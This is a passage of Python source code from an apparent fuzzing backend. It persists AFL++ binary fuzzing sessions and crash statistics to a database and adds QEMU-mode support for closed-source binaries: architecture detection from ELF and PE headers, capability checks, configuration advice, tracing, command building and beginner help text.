        use_stdin=use_stdin,
        execution_mode=execution_mode,
        coverage_backend=coverage_backend,
        coverage_map_size=coverage_map_size,
        enable_cmp_hints=enable_cmp_hints,
        enable_compcov=enable_compcov,
        cmp_hint_refresh_interval=cmp_hint_refresh_interval,
        persistent_max_execs=persistent_max_execs,
        persistent_shm_size=persistent_shm_size,
        sanitizer_target_path=sanitizer_target_path,
        sanitizer_timeout_ms=sanitizer_timeout_ms,
        sanitizer_max_runs=sanitizer_max_runs,
    )
    
    # Register
    _active_fuzzers[fuzzer.session.id] = fuzzer
    
    try:
        async for event in fuzzer.run(max_iterations, max_time_seconds):
            yield event
    finally:
        # Cleanup
        fuzzer.cleanup()
        if fuzzer.session.id in _active_fuzzers:
            del _active_fuzzers[fuzzer.session.id]


def persist_binary_fuzzer_session(
    session_id: str,
    db,  # SQLAlchemy session
    project_id: Optional[int] = None,
    user_id: Optional[int] = None,
    name: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """
    Persist a binary fuzzer session to the database.
    
    Call this after the session completes or when you want to save its state.
    
    Args:
        session_id: The session ID from the in-memory fuzzer
        db: SQLAlchemy database session
        project_id: Optional project to associate with
        user_id: Optional user who ran the session
        name: Optional custom name for the session
        
    Returns:
        The saved session data or None if session not found
    """
    from backend.models import models
    
    fuzzer = _active_fuzzers.get(session_id)
    if not fuzzer:
        logger.warning(f"Cannot persist session {session_id}: not found in active fuzzers")
        return None
    
    session = fuzzer.session
    crashes = fuzzer.get_crashes()
    
    # Check if session already exists in DB
    existing = db.query(models.BinaryFuzzerSession).filter(
        models.BinaryFuzzerSession.session_id == session_id
    ).first()
    
    if existing:
        # Update existing record
        db_session = existing
    else:
        # Create new record
        db_session = models.BinaryFuzzerSession(session_id=session_id)
        db.add(db_session)
    
    # Update all fields
    db_session.project_id = project_id
    db_session.user_id = user_id
    db_session.name = name or f"Binary Fuzzer: {os.path.basename(session.target_path)}"
    db_session.binary_path = session.target_path
    db_session.binary_name = os.path.basename(session.target_path)
    db_session.architecture = getattr(session, 'architecture', None)
    db_session.mode = session.mode.value if hasattr(session.mode, 'value') else str(session.mode)
    db_session.mutation_strategy = getattr(session, 'scheduler_strategy', None)
    db_session.status = session.status
    
    # Parse timestamps
    if session.started_at:
        try:
            db_session.started_at = datetime.fromisoformat(session.started_at.replace('Z', '+00:00'))
        except (ValueError, AttributeError):
            pass
    if session.completed_at:
        try:
            db_session.stopped_at = datetime.fromisoformat(session.completed_at.replace('Z', '+00:00'))
        except (ValueError, AttributeError):
            pass
    
    # Statistics
    db_session.total_executions = session.total_executions
    db_session.executions_per_second = session.executions_per_second
    db_session.total_crashes = session.total_crashes
    db_session.unique_crashes = session.unique_crashes
    db_session.hangs = session.total_timeouts
    db_session.coverage_edges = session.total_edges_discovered
    db_session.coverage_percentage = session.coverage_percentage
    db_session.corpus_size = session.corpus_size
    
    # Categorize crashes by severity
    critical_count = 0
    high_count = 0
    medium_count = 0
    low_count = 0
    
    for crash in (crashes or []):
        severity = crash.get('severity', 'medium').lower()
        if severity == 'critical':
            critical_count += 1
        elif severity == 'high':
            high_count += 1
        elif severity == 'medium':
            medium_count += 1
        else:
            low_count += 1
    
    # Also count exploitable memory errors as critical/high
    if hasattr(session, 'exploitable_errors') and session.exploitable_errors > 0:
        critical_count += session.exploitable_errors
    
    db_session.crashes_critical = critical_count
    db_session.crashes_high = high_count
    db_session.crashes_medium = medium_count
    db_session.crashes_low = low_count
    
    # Store detailed data as JSON
    db_session.crashes = crashes
    db_session.coverage_data = {
        "total_edges": session.total_edges_discovered,
        "coverage_percentage": session.coverage_percentage,
        "new_coverage_inputs": session.new_coverage_inputs,
        "favored_inputs": session.favored_inputs,
    }
    
    # Store memory errors if available
    if hasattr(fuzzer, 'memory_errors') and fuzzer.memory_errors:
        db_session.memory_errors = [e.to_dict() if hasattr(e, 'to_dict') else e for e in fuzzer.memory_errors]
    
    # Store config
    db_session.config = {
        "target_path": session.target_path,
        "target_args": session.target_args,
        "execution_mode": session.execution_mode,
        "coverage_backend": session.coverage_backend,
        "coverage_map_size": session.coverage_map_size,
        "scheduler_strategy": session.scheduler_strategy,
        "memory_safety_enabled": session.memory_safety_enabled,
        "sanitizer_target_path": session.sanitizer_target_path,
    }
    
    try:
        db.commit()
        db.refresh(db_session)
        logger.info(f"Persisted binary fuzzer session {session_id} to database (id={db_session.id})")
        return {
            "id": db_session.id,
            "session_id": db_session.session_id,
            "name": db_session.name,
            "status": db_session.status,
            "unique_crashes": db_session.unique_crashes,
            "coverage_percentage": db_session.coverage_percentage,
        }
    except Exception as e:
        logger.error(f"Failed to persist session {session_id}: {e}")
        db.rollback()
        return None


def get_persisted_session(
    session_id: str,
    db,
) -> Optional[Dict[str, Any]]:
    """
    Get a persisted session from the database.
    
    Args:
        session_id: The session ID
        db: SQLAlchemy database session
        
    Returns:
        Session data or None if not found
    """
    from backend.models import models
    
    db_session = db.query(models.BinaryFuzzerSession).filter(
        models.BinaryFuzzerSession.session_id == session_id
    ).first()
    
    if not db_session:
        return None
    
    return {
        "id": db_session.id,
        "session_id": db_session.session_id,
        "name": db_session.name,
        "binary_path": db_session.binary_path,
        "binary_name": db_session.binary_name,
        "architecture": db_session.architecture,
        "mode": db_session.mode,
        "status": db_session.status,
        "started_at": str(db_session.started_at) if db_session.started_at else None,
        "stopped_at": str(db_session.stopped_at) if db_session.stopped_at else None,
        "total_executions": db_session.total_executions,
        "executions_per_second": db_session.executions_per_second,
        "total_crashes": db_session.total_crashes,
        "unique_crashes": db_session.unique_crashes,
        "hangs": db_session.hangs,
        "coverage_edges": db_session.coverage_edges,
        "coverage_percentage": db_session.coverage_percentage,
        "corpus_size": db_session.corpus_size,
        "crashes_critical": db_session.crashes_critical,
        "crashes_high": db_session.crashes_high,
        "crashes_medium": db_session.crashes_medium,
        "crashes_low": db_session.crashes_low,
        "crashes": db_session.crashes,
        "memory_errors": db_session.memory_errors,
        "coverage_data": db_session.coverage_data,
        "ai_analysis": db_session.ai_analysis,
    }


def stop_fuzzing_session(session_id: str) -> Dict[str, Any]:
    """Stop a running fuzzing session."""
    fuzzer = _active_fuzzers.get(session_id)
    if not fuzzer:
        return {"success": False, "error": "Session not found"}
    
    fuzzer.stop()
    return {"success": True, "message": f"Session {session_id} stopped"}


def get_fuzzing_session(session_id: str) -> Optional[Dict[str, Any]]:
    """Get session status."""
    fuzzer = _active_fuzzers.get(session_id)
    if not fuzzer:
        return None
    return fuzzer.get_session()


def get_all_sessions() -> List[Dict[str, Any]]:
    """Get all active sessions."""
    return [f.get_session() for f in _active_fuzzers.values()]


def get_session_crashes(session_id: str) -> Optional[List[Dict[str, Any]]]:
    """Get crashes for a session."""
    fuzzer = _active_fuzzers.get(session_id)
    if not fuzzer:
        return None
    return fuzzer.get_crashes()


def get_memory_safety_report(
    session_id: str, 
    crash_id: Optional[str] = None
) -> Optional[Dict[str, Any]]:
    """
    Get memory safety analysis report for a session.
    
    Args:
        session_id: Fuzzing session ID
        crash_id: Optional specific crash ID for detailed report
        
    Returns:
        Memory safety report or None if session not found
    """
    fuzzer = _active_fuzzers.get(session_id)
    if not fuzzer:
        return None
    return fuzzer.get_memory_safety_report(crash_id)


# =============================================================================
# QEMU MODE FOR CLOSED-SOURCE BINARY FUZZING
# =============================================================================

class QemuArchitecture(str, Enum):
    """Supported QEMU architectures for binary fuzzing."""
    X86 = "i386"
    X86_64 = "x86_64"
    ARM = "arm"
    ARM64 = "aarch64"
    MIPS = "mips"
    MIPS64 = "mips64"
    MIPSEL = "mipsel"
    PPC = "ppc"
    PPC64 = "ppc64"
    RISCV32 = "riscv32"
    RISCV64 = "riscv64"
    UNKNOWN = "unknown"


class QemuModeType(str, Enum):
    """QEMU fuzzing modes."""
    STANDARD = "standard"           # Basic QEMU mode (-Q)
    PERSISTENT = "persistent"       # Persistent mode for faster fuzzing
    COMPCOV = "compcov"            # Comparison coverage
    INSTRIM = "instrim"            # Instruction trimming


@dataclass
class QemuCapabilities:
    """QEMU mode capabilities and configuration."""
    available: bool = False
    version: Optional[str] = None
    architectures: List[str] = field(default_factory=list)
    tools: Dict[str, Optional[str]] = field(default_factory=dict)
    features: Dict[str, bool] = field(default_factory=dict)
    error_message: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "available": self.available,
            "version": self.version,
            "architectures": self.architectures,
            "tools": self.tools,
            "features": self.features,
            "error_message": self.error_message,
        }


@dataclass
class BinaryArchitectureInfo:
    """Information about a binary's architecture."""
    architecture: QemuArchitecture
    bits: int  # 32 or 64
    endianness: str  # "little" or "big"
    is_pie: bool  # Position Independent Executable
    is_stripped: bool
    has_symbols: bool
    format: str  # ELF, PE, Mach-O
    machine: str  # Detailed machine type
    interpreter: Optional[str] = None  # Dynamic linker path
    libraries: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "architecture": self.architecture.value,
            "bits": self.bits,
            "endianness": self.endianness,
            "is_pie": self.is_pie,
            "is_stripped": self.is_stripped,
            "has_symbols": self.has_symbols,
            "format": self.format,
            "machine": self.machine,
            "interpreter": self.interpreter,
            "libraries": self.libraries,
        }


@dataclass
class QemuFuzzConfig:
    """Configuration for QEMU-mode fuzzing."""
    target_path: str
    architecture: QemuArchitecture = QemuArchitecture.X86_64
    mode: QemuModeType = QemuModeType.STANDARD
    
    # Persistent mode settings
    persistent_address: Optional[str] = None  # Hex address for persistent loop
    persistent_count: int = 10000  # Iterations per fork
    persistent_hook: Optional[str] = None  # Custom hook library
    
    # Coverage settings
    enable_compcov: bool = False  # Comparison coverage
    enable_instrim: bool = False  # Instruction trimming for smaller maps
    
    # Memory settings
    memory_limit_mb: int = 256
    address_sanitizer: bool = False
    
    # Execution settings
    timeout_ms: int = 5000
    target_args: str = "@@"
    env_vars: Dict[str, str] = field(default_factory=dict)
    
    # Input/output
    input_dir: str = "/fuzzing/seeds"
    output_dir: str = "/fuzzing/output"
    dictionary_path: Optional[str] = None
    
    # Advanced
    custom_qemu_path: Optional[str] = None
    extra_afl_flags: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "target_path": self.target_path,
            "architecture": self.architecture.value,
            "mode": self.mode.value,
            "persistent_address": self.persistent_address,
            "persistent_count": self.persistent_count,
            "persistent_hook": self.persistent_hook,
            "enable_compcov": self.enable_compcov,
            "enable_instrim": self.enable_instrim,
            "memory_limit_mb": self.memory_limit_mb,
            "address_sanitizer": self.address_sanitizer,
            "timeout_ms": self.timeout_ms,
            "target_args": self.target_args,
            "env_vars": self.env_vars,
            "input_dir": self.input_dir,
            "output_dir": self.output_dir,
            "dictionary_path": self.dictionary_path,
            "custom_qemu_path": self.custom_qemu_path,
            "extra_afl_flags": self.extra_afl_flags,
        }


@dataclass
class QemuTraceEntry:
    """A single entry from QEMU trace analysis."""
    address: int
    instruction: Optional[str] = None
    count: int = 1
    module: Optional[str] = None
    function: Optional[str] = None


@dataclass
class QemuTraceAnalysis:
    """Analysis of QEMU execution trace."""
    total_basic_blocks: int = 0
    unique_basic_blocks: int = 0
    total_edges: int = 0
    unique_edges: int = 0
    hotspots: List[QemuTraceEntry] = field(default_factory=list)
    coverage_map: Dict[int, int] = field(default_factory=dict)
    modules_hit: List[str] = field(default_factory=list)
    execution_time_ms: float = 0
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "total_basic_blocks": self.total_basic_blocks,
            "unique_basic_blocks": self.unique_basic_blocks,
            "total_edges": self.total_edges,
            "unique_edges": self.unique_edges,
            "hotspots": [
                {
                    "address": hex(h.address),
                    "instruction": h.instruction,
                    "count": h.count,
                    "module": h.module,
                    "function": h.function,
                }
                for h in self.hotspots[:20]  # Top 20
            ],
            "modules_hit": self.modules_hit,
            "execution_time_ms": self.execution_time_ms,
        }


class QemuModeManager:
    """
    Comprehensive QEMU mode management for closed-source binary fuzzing.
    
    QEMU mode allows fuzzing binaries without source code by using
    CPU emulation to track code coverage at runtime. This enables
    security testing of:
    - Proprietary software
    - Firmware images
    - Malware samples (in isolated environments)
    - Pre-compiled libraries
    - Legacy binaries
    
    Features:
    - Multi-architecture support (x86, x64, ARM, ARM64, MIPS, PPC, RISC-V)
    - Persistent mode for 10-20x faster fuzzing
    - Comparison coverage for better mutation guidance
    - Execution tracing and analysis
    - Automatic architecture detection
    """
    
    # AFL++ QEMU tool paths
    AFL_QEMU_TRACE = "/usr/local/bin/afl-qemu-trace"
    QEMU_BASE_PATH = "/usr/local/bin"
    
    # Architecture to QEMU binary mapping
    ARCH_TO_QEMU = {
        QemuArchitecture.X86: "qemu-i386",
        QemuArchitecture.X86_64: "qemu-x86_64",
        QemuArchitecture.ARM: "qemu-arm",
        QemuArchitecture.ARM64: "qemu-aarch64",
        QemuArchitecture.MIPS: "qemu-mips",
        QemuArchitecture.MIPS64: "qemu-mips64",
        QemuArchitecture.MIPSEL: "qemu-mipsel",
        QemuArchitecture.PPC: "qemu-ppc",
        QemuArchitecture.PPC64: "qemu-ppc64",
        QemuArchitecture.RISCV32: "qemu-riscv32",
        QemuArchitecture.RISCV64: "qemu-riscv64",
    }
    
    # ELF machine types to architecture
    ELF_MACHINE_MAP = {
        0x03: (QemuArchitecture.X86, 32),        # EM_386
        0x3E: (QemuArchitecture.X86_64, 64),     # EM_X86_64
        0x28: (QemuArchitecture.ARM, 32),        # EM_ARM
        0xB7: (QemuArchitecture.ARM64, 64),      # EM_AARCH64
        0x08: (QemuArchitecture.MIPS, 32),       # EM_MIPS
        0x14: (QemuArchitecture.PPC, 32),        # EM_PPC
        0x15: (QemuArchitecture.PPC64, 64),      # EM_PPC64
        0xF3: (QemuArchitecture.RISCV64, 64),    # EM_RISCV (need to check EI_CLASS)
    }
    
    def __init__(self):
        self._capabilities: Optional[QemuCapabilities] = None
        self._capabilities_checked = False
    
    def check_capabilities(self, force_refresh: bool = False) -> QemuCapabilities:
        """
        Check QEMU mode capabilities and available architectures.
        
        Returns comprehensive information about QEMU availability
        and supported features.
        """
        if self._capabilities_checked and not force_refresh:
            return self._capabilities
        
        caps = QemuCapabilities()
        caps.tools = {}
        caps.features = {}
        caps.architectures = []
        
        # Check AFL-QEMU trace binary
        for path in [self.AFL_QEMU_TRACE, "/opt/AFLplusplus/afl-qemu-trace", "/usr/bin/afl-qemu-trace"]:
            if os.path.isfile(path) and os.access(path, os.X_OK):
                caps.tools["afl-qemu-trace"] = path
                self.AFL_QEMU_TRACE = path
                break
        
        # Check for architecture-specific QEMU binaries
        for arch, qemu_name in self.ARCH_TO_QEMU.items():
            for base in [self.QEMU_BASE_PATH, "/usr/bin", "/opt/AFLplusplus"]:
                qemu_path = os.path.join(base, qemu_name)
                if os.path.isfile(qemu_path) and os.access(qemu_path, os.X_OK):
                    caps.tools[qemu_name] = qemu_path
                    caps.architectures.append(arch.value)
                    break
        
        # Check AFL++ QEMU mode support
        try:
            result = subprocess.run(
                ["/usr/local/bin/afl-fuzz", "-h"],
                capture_output=True,
                text=True,
                timeout=5
            )
            output = result.stdout + result.stderr
            
            # Check for QEMU flags in help
            if "-Q" in output:
                caps.features["standard_qemu"] = True
            if "-QQ" in output or "QEMU persistent" in output.lower():
                caps.features["persistent_qemu"] = True
            if "COMPCOV" in output or "AFL_COMPCOV" in output:
                caps.features["compcov"] = True
            if "INSTRIM" in output:
                caps.features["instrim"] = True
            
            caps.available = caps.features.get("standard_qemu", False)
            
            # Get version
            if caps.available:
                version_match = re.search(r'afl.*?(\d+\.\d+[a-z]?)', output, re.IGNORECASE)
                if version_match:
                    caps.version = version_match.group(1)
                else:
                    caps.version = "available"
                    
        except FileNotFoundError:
            caps.error_message = "AFL++ not found. Install AFL++ with QEMU support."
        except subprocess.TimeoutExpired:
            caps.error_message = "AFL++ check timed out"
        except Exception as e:
            caps.error_message = f"Error checking AFL++: {str(e)}"
        
        # If no QEMU support detected, provide helpful error
        if not caps.available:
            if not caps.error_message:
                caps.error_message = (
                    "QEMU mode not available. Ensure AFL++ was built with QEMU support: "
                    "cd /path/to/AFLplusplus && make distrib"
                )
        
        self._capabilities = caps
        self._capabilities_checked = True
        
        return caps
    
    def detect_binary_architecture(self, binary_path: str) -> BinaryArchitectureInfo:
        """
        Detect the architecture and properties of a binary file.
        
        Analyzes ELF headers to determine:
        - CPU architecture (x86, x64, ARM, etc.)
        - Bit width (32 or 64)
        - Endianness
        - Security features (PIE, stripped, etc.)
        """
        info = BinaryArchitectureInfo(
            architecture=QemuArchitecture.UNKNOWN,
            bits=64,
            endianness="little",
            is_pie=False,
            is_stripped=True,
            has_symbols=False,
            format="unknown",
            machine="unknown"
        )
        
        try:
            with open(binary_path, "rb") as f:
                # Read ELF header
                magic = f.read(4)
                
                if magic[:4] == b'\x7fELF':
                    info.format = "ELF"
                    
                    # EI_CLASS - 32 or 64 bit
                    ei_class = f.read(1)[0]
                    info.bits = 64 if ei_class == 2 else 32
                    
                    # EI_DATA - endianness
                    ei_data = f.read(1)[0]
                    info.endianness = "big" if ei_data == 2 else "little"
                    
                    # Skip to e_type and e_machine
                    f.seek(16)  # Skip rest of e_ident
                    
                    # Read e_type (2 bytes) - determine if PIE
                    e_type_bytes = f.read(2)
                    if info.endianness == "little":
                        e_type = struct.unpack("<H", e_type_bytes)[0]
                    else:
                        e_type = struct.unpack(">H", e_type_bytes)[0]
                    
                    # ET_DYN (3) could be PIE or shared library
                    info.is_pie = e_type == 3
                    
                    # Read e_machine (2 bytes)
                    e_machine_bytes = f.read(2)
                    if info.endianness == "little":
                        e_machine = struct.unpack("<H", e_machine_bytes)[0]
                    else:
                        e_machine = struct.unpack(">H", e_machine_bytes)[0]
                    
                    # Map machine type to architecture
                    if e_machine in self.ELF_MACHINE_MAP:
                        arch, bits = self.ELF_MACHINE_MAP[e_machine]
                        info.architecture = arch
                        # RISC-V needs EI_CLASS to determine 32 vs 64
                        if e_machine == 0xF3:
                            info.architecture = QemuArchitecture.RISCV64 if info.bits == 64 else QemuArchitecture.RISCV32
                    
                    info.machine = f"0x{e_machine:04x}"
                    
                elif magic[:2] == b'MZ':
                    info.format = "PE"
                    # PE/COFF - Windows executable
                    # Read PE header offset
                    f.seek(0x3C)
                    pe_offset_bytes = f.read(4)
                    pe_offset = struct.unpack("<I", pe_offset_bytes)[0]
                    
                    f.seek(pe_offset)
                    pe_sig = f.read(4)
                    if pe_sig == b'PE\x00\x00':
                        machine_bytes = f.read(2)
                        machine = struct.unpack("<H", machine_bytes)[0]
                        
                        if machine == 0x014c:
                            info.architecture = QemuArchitecture.X86
                            info.bits = 32
                        elif machine == 0x8664:
                            info.architecture = QemuArchitecture.X86_64
                            info.bits = 64
                        elif machine == 0x01c0:
                            info.architecture = QemuArchitecture.ARM
                            info.bits = 32
                        elif machine == 0xaa64:
                            info.architecture = QemuArchitecture.ARM64
                            info.bits = 64
                            
                        info.machine = f"0x{machine:04x}"
                        
                elif magic[:4] == b'\xfe\xed\xfa\xce':  # Mach-O 32-bit
                    info.format = "Mach-O"
                    info.bits = 32
                    info.architecture = QemuArchitecture.X86
                    
                elif magic[:4] == b'\xfe\xed\xfa\xcf':  # Mach-O 64-bit
                    info.format = "Mach-O"
                    info.bits = 64
                    info.architecture = QemuArchitecture.X86_64
                    
        except Exception as e:
            logger.warning(f"Error detecting binary architecture: {e}")
        
        # Try to get more info using file command
        try:
            result = subprocess.run(
                ["file", binary_path],
                capture_output=True,
                text=True,
                timeout=5
            )
            output = result.stdout.lower()
            
            # Check if stripped
            info.is_stripped = "stripped" in output and "not stripped" not in output
            info.has_symbols = "not stripped" in output
            
            # Additional architecture detection from file output
            if info.architecture == QemuArchitecture.UNKNOWN:
                if "x86-64" in output or "x86_64" in output:
                    info.architecture = QemuArchitecture.X86_64
                    info.bits = 64
                elif "80386" in output or "i386" in output:
                    info.architecture = QemuArchitecture.X86
                    info.bits = 32
                elif "aarch64" in output or "arm64" in output:
                    info.architecture = QemuArchitecture.ARM64
                    info.bits = 64
                elif "arm" in output:
                    info.architecture = QemuArchitecture.ARM
                    info.bits = 32
                elif "mips64" in output:
                    info.architecture = QemuArchitecture.MIPS64
                    info.bits = 64
                elif "mips" in output:
                    if "mipsel" in output or "little" in output:
                        info.architecture = QemuArchitecture.MIPSEL
                    else:
                        info.architecture = QemuArchitecture.MIPS
                    info.bits = 32
                    
        except Exception:
            pass
        
        # Try to get dynamic libraries using ldd or readelf
        try:
            result = subprocess.run(
                ["readelf", "-d", binary_path],
                capture_output=True,
                text=True,
                timeout=5
            )
            for line in result.stdout.split("\n"):
                if "NEEDED" in line:
                    lib_match = re.search(r'\[(.+?)\]', line)
                    if lib_match:
                        info.libraries.append(lib_match.group(1))
                elif "INTERP" in line:
                    interp_match = re.search(r'\[(.+?)\]', line)
                    if interp_match:
                        info.interpreter = interp_match.group(1)
        except Exception:
            pass
        
        return info
    
    def recommend_qemu_config(
        self,
        binary_path: str,
        arch_info: Optional[BinaryArchitectureInfo] = None
    ) -> Dict[str, Any]:
        """
        Generate recommended QEMU fuzzing configuration for a binary.
        
        Analyzes the binary and provides:
        - Optimal QEMU mode settings
        - Architecture-specific recommendations
        - Performance optimization tips
        """
        if not arch_info:
            arch_info = self.detect_binary_architecture(binary_path)
        
        caps = self.check_capabilities()
        
        recommendations = {
            "architecture_detected": arch_info.to_dict(),
            "qemu_available": caps.available,
            "recommended_mode": QemuModeType.STANDARD.value,
            "can_use_persistent": False,
            "warnings": [],
            "tips": [],
            "config": {},
        }
        
        # Check if architecture is supported
        if arch_info.architecture == QemuArchitecture.UNKNOWN:
            recommendations["warnings"].append(
                "Could not detect binary architecture. QEMU mode may not work correctly."
            )
        elif arch_info.architecture.value not in caps.architectures:
            recommendations["warnings"].append(
                f"Architecture {arch_info.architecture.value} may not be fully supported. "
                f"Available: {', '.join(caps.architectures)}"
            )
        
        # Recommend persistent mode for compatible binaries
        if caps.features.get("persistent_qemu"):
            recommendations["can_use_persistent"] = True
            recommendations["tips"].append(
                "Persistent mode available! Can be 10-20x faster. "
                "Requires finding a suitable loop point in the binary."
            )
            if not arch_info.is_pie:
                recommendations["tips"].append(
                    "Binary is not PIE - persistent addresses will be stable."
                )
        
        # Memory recommendations based on architecture
        if arch_info.bits == 64:
            recommendations["config"]["memory_limit_mb"] = 512
            recommendations["tips"].append(
                "64-bit binary detected. Using higher memory limit (512MB)."
            )
        else:
            recommendations["config"]["memory_limit_mb"] = 256
        
        # Timeout recommendations
        if arch_info.is_stripped:
            recommendations["config"]["timeout_ms"] = 10000
            recommendations["tips"].append(
                "Binary is stripped - using longer timeout (10s) for complex paths."
            )
        else:
            recommendations["config"]["timeout_ms"] = 5000
        
        # CompareCoverage recommendation
        if caps.features.get("compcov"):
            recommendations["tips"].append(
                "COMPCOV available. Enable for better coverage of strcmp/memcmp comparisons."
            )
            recommendations["config"]["enable_compcov"] = True
        
        # Build recommended config
        recommendations["config"].update({
            "architecture": arch_info.architecture.value,
            "mode": recommendations["recommended_mode"],
            "target_path": binary_path,
        })
        
        return recommendations
    
    async def run_qemu_trace(
        self,
        binary_path: str,
        input_data: bytes,
        timeout_seconds: float = 30.0,
    ) -> QemuTraceAnalysis:
        """
        Run a single execution with QEMU tracing to analyze coverage.
        
        Useful for:
        - Understanding which code paths an input exercises
        - Finding good persistent mode entry points
        - Analyzing crash root causes
        """
        analysis = QemuTraceAnalysis()
        
        caps = self.check_capabilities()
        if not caps.available:
            logger.warning("QEMU mode not available for tracing")
            return analysis
        
        arch_info = self.detect_binary_architecture(binary_path)
        qemu_binary = caps.tools.get(self.ARCH_TO_QEMU.get(arch_info.architecture, ""))
        
        if not qemu_binary:
            logger.warning(f"No QEMU binary found for architecture {arch_info.architecture}")
            return analysis
        
        # Create temporary input file
        with tempfile.NamedTemporaryFile(delete=False, suffix=".input") as tmp:
            tmp.write(input_data)
            input_path = tmp.name
        
        try:
            start_time = time.time()
            
            # Run with AFL QEMU trace mode
            env = os.environ.copy()
            env["AFL_INST_RATIO"] = "100"  # Full instrumentation
            env["AFL_DEBUG"] = "1"  # Get debug output with coverage info
            
            # Build command
            cmd = [qemu_binary, binary_path, input_path]
            
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env,
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(),
                    timeout=timeout_seconds
                )
            except asyncio.TimeoutError:
                proc.kill()
                await proc.wait()
                stdout, stderr = b"", b"timeout"
            
            analysis.execution_time_ms = (time.time() - start_time) * 1000
            
            # Parse trace output (format depends on AFL++ QEMU version)
            trace_output = (stdout + stderr).decode(errors='replace')
            
            # Count basic blocks from debug output
            bb_matches = re.findall(r'exec.*?0x([0-9a-fA-F]+)', trace_output)
            for bb_addr in bb_matches:
                addr = int(bb_addr, 16)
                analysis.coverage_map[addr] = analysis.coverage_map.get(addr, 0) + 1
            
            analysis.total_basic_blocks = sum(analysis.coverage_map.values())
            analysis.unique_basic_blocks = len(analysis.coverage_map)
            
            # Extract hotspots (most frequently executed)
            sorted_bbs = sorted(
                analysis.coverage_map.items(),
                key=lambda x: x[1],
                reverse=True
            )
            analysis.hotspots = [
                QemuTraceEntry(address=addr, count=count)
                for addr, count in sorted_bbs[:20]
            ]
            
        except Exception as e:
            logger.exception(f"Error running QEMU trace: {e}")
        finally:
            # Cleanup
            try:
                os.unlink(input_path)
            except:
                pass
        
        return analysis
    
    def build_qemu_afl_command(self, config: QemuFuzzConfig) -> Tuple[List[str], Dict[str, str]]:
        """
        Build AFL++ command line and environment for QEMU mode fuzzing.
        
        Returns:
            Tuple of (command_args, environment_vars)
        """
        cmd = ["/usr/local/bin/afl-fuzz"]
        env = os.environ.copy()
        
        # Basic AFL settings
        cmd.extend([
            "-i", config.input_dir,
            "-o", config.output_dir,
            "-t", str(config.timeout_ms),
            "-m", str(config.memory_limit_mb),
        ])
        
        # QEMU mode flags
        if config.mode == QemuModeType.PERSISTENT and config.persistent_address:
            cmd.append("-Q")  # Still need -Q for QEMU
            env["AFL_QEMU_PERSISTENT_ADDR"] = config.persistent_address
            env["AFL_QEMU_PERSISTENT_CNT"] = str(config.persistent_count)
            if config.persistent_hook:
                env["AFL_QEMU_PERSISTENT_HOOK"] = config.persistent_hook
        else:
            cmd.append("-Q")  # Standard QEMU mode
        
        # Comparison coverage
        if config.enable_compcov:
            env["AFL_COMPCOV_LEVEL"] = "2"
        
        # Instruction trimming
        if config.enable_instrim:
            env["AFL_INST_RATIO"] = "50"  # Reduce instrumentation overhead
        
        # No UI for scripted runs
        env["AFL_NO_UI"] = "1"
        env["AFL_SKIP_CPUFREQ"] = "1"
        env["AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES"] = "1"
        
        # Custom environment variables
        for key, value in config.env_vars.items():
            env[key] = value
        
        # Dictionary
        if config.dictionary_path and os.path.isfile(config.dictionary_path):
            cmd.extend(["-x", config.dictionary_path])
        
        # Extra flags
        cmd.extend(config.extra_afl_flags)
        
        # Target
        cmd.append("--")
        cmd.append(config.target_path)
        
        # Target arguments
        if config.target_args:
            cmd.extend(config.target_args.split())
        
        return cmd, env
    
    def get_qemu_mode_help(self, for_beginners: bool = True) -> Dict[str, Any]:
        """
        Get comprehensive help about QEMU mode fuzzing.
        
        Returns explanations suitable for the target audience.
        """
        help_info = {
            "title": "QEMU Mode Fuzzing Guide",
            "overview": "",
            "when_to_use": [],
            "modes": {},
            "architecture_support": {},
            "performance_tips": [],
            "common_issues": [],
            "examples": [],
        }
        
        if for_beginners:
            help_info["overview"] = (
                "QEMU mode lets you fuzz ANY binary program, even if you don't have "
                "the source code. It works by running your program inside a CPU emulator "
                "(QEMU) that watches which parts of the code run. This is slower than "
                "regular fuzzing, but it's the only way to test closed-source software."
            )
            
            help_info["when_to_use"] = [
                "You downloaded a binary from the internet and want to test it for bugs",
                "You're testing proprietary/commercial software",
                "You're analyzing potential malware (BE CAREFUL - use isolation!)",
                "You have a pre-compiled library without source code",
                "The program is written in a language without AFL++ support",
            ]
            
            help_info["modes"] = {
                "standard": {
                    "name": "Standard QEMU Mode",
                    "description": "Basic mode - just add -Q flag. Works with any binary.",
                    "speed": "⭐⭐ (2-10x slower than native)",
                    "ease": "⭐⭐⭐⭐⭐ (just enable it)",
                },
                "persistent": {
                    "name": "Persistent QEMU Mode",
                    "description": (
                        "Advanced mode that's MUCH faster. Requires finding a good 'loop point' "
                        "in the binary where input processing starts."
                    ),
                    "speed": "⭐⭐⭐⭐ (10-20x faster than standard QEMU)",
                    "ease": "⭐⭐ (requires reverse engineering)",
                },
                "compcov": {
                    "name": "Comparison Coverage",
                    "description": (
                        "Tracks string/memory comparisons (strcmp, memcmp). Helps the fuzzer "
                        "figure out 'magic values' like passwords or checksums."
                    ),
                    "speed": "⭐⭐ (slightly slower)",
                    "ease": "⭐⭐⭐⭐ (just enable the option)",
                },
            }
            
            help_info["performance_tips"] = [
                "Start with standard mode (-Q) to make sure everything works",
                "If fuzzing is too slow, look into persistent mode",
                "Enable COMPCOV if your target does string comparisons",
                "Give it plenty of memory - emulation needs more than native",
                "Use a longer timeout (10-30s) since emulation is slower",
            ]
            
            help_info["common_issues"] = [
                {
                    "problem": "Fuzzing is extremely slow",
                    "solution": "This is normal for QEMU mode. Try persistent mode for speedup.",
                },
                {
                    "problem": "'Missing architecture support'",
                    "solution": "The binary might be for a different CPU. Check with 'file binary'.",
                },
                {
                    "problem": "'Crashes immediately' or 'hangs on startup'",
                    "solution": "The binary might need specific files or environment. Try running it manually first.",
                },
                {
                    "problem": "No coverage / always same paths",
                    "solution": "Binary might use anti-debugging. Try with AFL_QEMU_DISABLE_CACHE=1.",
                },
            ]
            
        else:
            # Technical/advanced help
            help_info["overview"] = (
